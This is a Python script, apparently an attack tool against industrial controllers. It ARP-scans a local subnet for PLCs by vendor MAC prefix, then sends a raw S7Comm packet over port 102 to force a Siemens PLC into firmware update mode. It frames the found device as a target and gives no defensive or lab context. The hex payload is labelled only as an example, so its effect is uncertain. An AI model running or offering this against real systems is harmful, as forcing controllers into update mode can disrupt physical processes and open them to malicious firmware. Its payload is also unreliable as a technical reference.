import socket
import struct
from scapy.all import ARP, Ether, srp

# Function to scan the network and find the PLC's IP
def find_plc(ip_range="192.168.1.0/24", plc_mac_prefixes=["00:0E:C6", "00:1A:92"]):
    """
    Scans the network using ARP requests and identifies the PLC based on known MAC address prefixes.
    Modify the plc_mac_prefixes based on the vendor.
    """
    print("[*] Scanning the network for PLC...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range), timeout=2, verbose=False)

    for sent, received in ans:
        if any(received.hwsrc.upper().startswith(prefix) for prefix in plc_mac_prefixes):
            print(f"[+] Found PLC: IP={received.psrc}, MAC={received.hwsrc}")
            return received.psrc
    
    print("[!] No PLC found on the network.")
    return None

# Function to send an S7Comm packet to a Siemens PLC to enable firmware update mode
def enable_firmware_update_mode_siemens(plc_ip, plc_port=102):
    """
    Establishes a connection to send an S7 request to put the PLC in firmware update mode.
    """
    print(f"[*] Connecting to PLC at {plc_ip}:{plc_port}...")
    s7_fw_update_command = bytes.fromhex(
        "0300002102F080320100000800000800000000F0000000000000"  # Example S7Comm command
    )

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            s.connect((plc_ip, plc_port))
            s.send(s7_fw_update_command)
            response = s.recv(1024)
            print("[+] Sent firmware update activation command.")
            print("[*] Response:", response.hex())

    except Exception as e:
        print(f"[!] Failed to send command: {e}")

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc()

    if plc_ip:
        enable_firmware_update_mode_siemens(plc_ip)
    else:
        print("[!] Could not locate a PLC to target.")